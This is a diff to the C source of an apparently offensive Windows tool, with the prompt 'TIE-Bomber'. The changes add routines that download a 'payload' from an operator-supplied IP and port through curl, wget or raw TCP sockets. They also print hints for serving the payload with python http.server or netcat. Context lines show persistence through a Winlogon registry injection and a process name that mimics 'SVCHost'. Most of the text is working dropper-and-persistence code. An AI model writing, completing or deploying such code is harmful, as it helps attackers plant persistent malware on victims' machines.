@@ -1,4 +1,6 @@
+#include <winsock2.h>
 #include <windows.h>
+#include <wininet.h>
 #include <stdlib.h>
 #include <ctype.h>
 #include <urlmon.h>
@@ -8,6 +10,8 @@
 #include <stdarg.h>
 
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 #define PERS_NAME "SVCHost"
 #define MAX_URL 2048
@@ -21,12 +25,13 @@
 typedef int (*ValidatorFunc)(char *arg, void *data);
 
 VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line);
+VOID TranslateErrorPrintImplStr(const char *errMsg, const char *file, int line);
 
 VOID _ListOpts(const char *str, ...);
 #define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)
 
 #define TranslateErrorPrint(errCode) TranslateErrorPrintImpl(errCode, __FILE__, __LINE__);
-
+#define TranslateErrorPrintStr(errMsg) TranslateErrorPrintImplStr(errMsg, __FILE__, __LINE__);
 typedef struct _WRITABLE_DIR {
     char path[MAX_PATH + 1];
 } WRITABLE_DIR, *PWRITABLE_DIR;
@@ -49,7 +54,6 @@ VOID _ListOpts(const char *str, ...) {
     va_start(arg, str);
     for (int i=0;i<20;i++) printf("%c", '-');
     printf("\n\n");
-    printf("[0]: Just give me something that works\n");
     while (str) {
         printf("[%d]: %s\n", ++o, str);
         str = va_arg(arg, const char *);
@@ -118,14 +122,14 @@ BOOL ExecuteCommand(const char* command) {
 
 BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
     int rc;
-
+    puts("");
     while (TRUE) {
         printf("TIE-Bomber(%s) > ", prompt);
         fflush(stdout);
         fgets(buffer, (int)bufferSize, stdin);
         buffer[strcspn(buffer, "\n")] = '\0';
         if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0 || strcmp(buffer, "no") == 0 || strcmp(buffer, "n") == 0) {
-                printf("[*] Exiting...\n");
+                printf("\n[*] Exiting...\n");
                 return FALSE;
         }
         if (validator && strcmp(buffer, "h") == 0) {
@@ -134,7 +138,7 @@ BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, Valid
         
         if (!validator) {
             if (strcmp(buffer, "y") == 0 || strcmp(buffer, "yes") == 0) {
-                return TRUE;
+                break;
             }
             continue;   
         }    
@@ -148,6 +152,8 @@ BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, Valid
         }
         break;
     }
+    puts("");
+    return TRUE;
 }
 
 BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
@@ -176,6 +182,10 @@ VOID TranslateError(DWORD errCode, char **pErrMessage) {
 	    (LPSTR)pErrMessage,
 	    0,
 	    NULL);
+}
+
+VOID TranslateErrorPrintImplStr(const char* errMsg, const char *file, int line) {
+    fprintf(stderr, "[-] ERROR at %s:%d: %s", file, line, errMsg);
 }
 
 VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line) {
@@ -217,10 +227,53 @@ BOOL LocateBinary(char *binaryPath, const char *binary, DWORD binaryPathSize) {
     );
 
     if (!rc) {
-        printf("[-] Binary %s not found!", binary);
+        printf("[-] Binary %s not found!\n", binary);
     }
     
     return rc;
+}
+
+BOOL IsResourceValid(const char *source) {
+    HINTERNET hInternet = InternetOpenA(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", 
+        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
+    );
+    if (!hInternet) {
+        TranslateErrorPrint(GetLastError());
+        return FALSE;
+    }
+    // Decrease the timeout
+    DWORD timeout = 2000;
+    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
+
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, source, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hInternet);
+        TranslateErrorPrintStr("Failed to create an URL object. Check whether the given url:port is valid");
+        return FALSE;
+    }
+    
+    DWORD statusCode = 0;
+    DWORD size = sizeof(statusCode);
+    if (!HttpQueryInfoA(hUrl, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &size, NULL)) {
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hUrl);
+        TranslateErrorPrintStr("HTTP Query failed");
+        return FALSE;
+    }
+    
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+
+    if (statusCode >= 200 && statusCode < 400) {
+        return TRUE;
+    } else {
+        printf("[!] Resource is not available. Status code: %d\n", statusCode);
+        printf("[?] To start a webserver for hosting your payload, run the following command inside the directory of your binary\n\t$ python3 -m http.server\n");
+        return FALSE;
+    }
 }
 
 BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
@@ -268,15 +321,79 @@ BOOL DownloadUsingCertutil(const PDOWNLOAD_CONTEXT pDc) {
 }
 
 BOOL DownloadUsingWget(const PDOWNLOAD_CONTEXT pDc) {
+    char wgetPath[MAX_PATH + 1];
+    int wgetPathLen = LocateBinary(wgetPath, "wget.exe", MAX_PATH);
+    if (!wgetPathLen) {
+        return FALSE;
+    }
+
+    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
+    snprintf(command, sizeof(command), "%s -O %s %s", wgetPath, pDc->targetPath, pDc->sourceUrl);
+    return ExecuteCommand(command);
     printf("[*] Downloading the payload using wget\n");
 }
 
 BOOL DownloadUsingCurl(const PDOWNLOAD_CONTEXT pDc) {
+    char curlPath[MAX_PATH + 1];
+    int curlPathLen = LocateBinary(curlPath, "curl.exe", MAX_PATH);
+    if (!curlPathLen) {
+        return FALSE;
+    }
+
+    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
+    snprintf(command, sizeof(command), "%s -o %s %s", curlPath, pDc->targetPath, pDc->sourceUrl);
+    return ExecuteCommand(command);
     printf("[*] Downloading the payload using curl\n");
 }
 
 BOOL DownloadUsingTCPSocket(const PDOWNLOAD_CONTEXT pDc) {
     printf("[*] Downloading the payload using raw TCP sockets\n");
+    
+    WSADATA wsa;
+    struct sockaddr_in serverAddr;
+    char buffer[4096];
+    int bufferSize = sizeof(buffer);
+    int received;
+    long long totalReceived = 0;
+    FILE* f;
+    char errMsg[1024];
+
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (clientSocket == INVALID_SOCKET) {
+        return FALSE;
+    }
+
+    serverAddr.sin_addr.s_addr = inet_addr(pDc->ip);
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(pDc->port);
+     
+    if (connect(clientSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        TranslateErrorPrint(WSAGetLastError());
+        snprintf(errMsg, sizeof(errMsg), "Connection failed to %s:%d.\n[!] Make sure to host your file with the following command\n\t$ nc -nlvp <PORT> -q 1< <PAYLOAD>\n", pDc->ip, pDc->port);
+        TranslateErrorPrintStr(errMsg);
+        return FALSE;
+    }
+
+    f = fopen(pDc->targetPath, "wb");
+    if (!f) {
+        closesocket(clientSocket);
+        snprintf(errMsg, sizeof(errMsg), "Failed to open %s\n", pDc->targetPath);
+        TranslateErrorPrintStr(errMsg);
+        return FALSE;
+    }
+
+    while ((received = recv(clientSocket, buffer, bufferSize, 0)) > 0) {
+        fwrite(buffer, 1, received, f);
+        totalReceived += received;
+    }
+    
+    printf("[+] Successfully received %lu bytes of data\n", totalReceived);
+    fclose(f);
+    closesocket(clientSocket);
+    WSACleanup();
+    return TRUE;
 }
 
 int HandleDownload(char* opt, void *data) {
@@ -312,8 +429,11 @@ int HandleDownload(char* opt, void *data) {
                 return FAIL_ERROR;
             }
             return SUCCESS;
-        case '4': 
-            break;
+        case '4':
+            if (!DownloadUsingCurl(pDownloadContext)) {
+                return FAIL_ERROR;
+            }
+            return SUCCESS;
         case '5':
             break;
         default:
@@ -415,11 +535,11 @@ BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
 	return TRUE;
 }
 
-BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port) {
+BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port, BOOL *socketReceive) {
 	int opt;
 	int iFlag = 0, eFlag = 0, tFlag = 0;
 	*port = 80;
-	while ((opt = getopt(argc, argv, "i:e:t:p:")) != -1) {
+	while ((opt = getopt(argc, argv, "i:e:t:p:s")) != -1) {
 		switch (opt) {
 			case 'i':
 				*ipLen = strlen(optarg);
@@ -454,6 +574,9 @@ BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *ex
 					return FALSE;
 				}
                 break;
+            case 's':
+                *socketReceive = TRUE;
+            break;
 			default:
 				return FALSE;
 				break;
@@ -482,6 +605,7 @@ int main(int argc, char* argv[]) {
     char source[MAX_URL + 1];
     char targetDirTmp[MAX_PATH + 1];
     char opt[16];
+    BOOL receiveUsingSocket;
 
     char *errMsg;
     DWORD errCode;
@@ -489,14 +613,24 @@ int main(int argc, char* argv[]) {
     WRITABLE_DIR *wdirs = NULL;
     int capacity = 16, count = 0;
     
-	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port) == FALSE) {
-        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>]\n", argv[0]);
+	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
+        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
 		exit(1);
 	}
-
-	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
-	printf("[*] Source to extract payload from: %s\n", source);
-
+    
+    if (!receiveUsingSocket) {
+      	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
+    	printf("[*] Source to extract payload from: %s\n", source);
+        printf("[*] Checking whether resource is accessible\n");
+        if (!IsResourceValid(source)) {
+            if (!PromptUntilValid("Continue[y/n]", opt, sizeof(opt), NULL, NULL)) {
+                exit(1);
+            }
+        }
+    } else {
+        printf("[*] Will be received using TCP socket. Host: %s:%d\n", ip, port);
+    }
+ 
     if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
         exit(1); 
     }
@@ -526,16 +660,24 @@ int main(int argc, char* argv[]) {
         .ip = ip,
         .ipLen = ipLen,
         .port = port,
-        .sourceUrl = source,
-        .sourceUrlLen = strlen(source),
         .targetPath = payloadFull,
         .targetPathLen = payloadFullLen
     };
-    printf("\n\n[*] **DOWNLOAD OPTION**\n\n"); 
-    HandleDownload(NULL, NULL);
-    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext)) {
-        exit(1);
+
+    if (!receiveUsingSocket) {
+        printf("\n\n[*] **DOWNLOAD OPTION**\n\n");
+        downloadContext.sourceUrl = source;
+        downloadContext.sourceUrlLen = strlen(source);
+        HandleDownload(NULL, NULL);
+        if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext)) {
+            exit(1);
+        }
+    } else {
+        if (!DownloadUsingTCPSocket((PDOWNLOAD_CONTEXT) &downloadContext)) {
+            exit(1);
+        }
     }
+
     printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n"); 
 /*
 	if (!FileExists(malware)) {
